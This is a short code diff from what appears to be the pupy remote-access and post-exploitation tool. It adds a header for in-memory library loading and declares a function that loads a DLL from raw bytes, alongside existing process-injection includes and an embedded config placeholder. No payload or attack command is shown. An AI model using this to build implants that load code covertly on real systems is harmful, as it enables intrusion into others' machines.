@@ -6,8 +6,11 @@
 #include "Python-dynload.h"
 #include <stdio.h>
 #include <windows.h>
+#include "MyLoadLibrary.h"
 #include "base_inject.h"
 static char module_doc[] = "Builtins utilities for pupy";
+
+HMODULE _load_dll(const char *name, const char *bytes);
 
 char pupy_config[32768]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup. scriptlets also takes more space !
 extern const DWORD dwPupyArch;
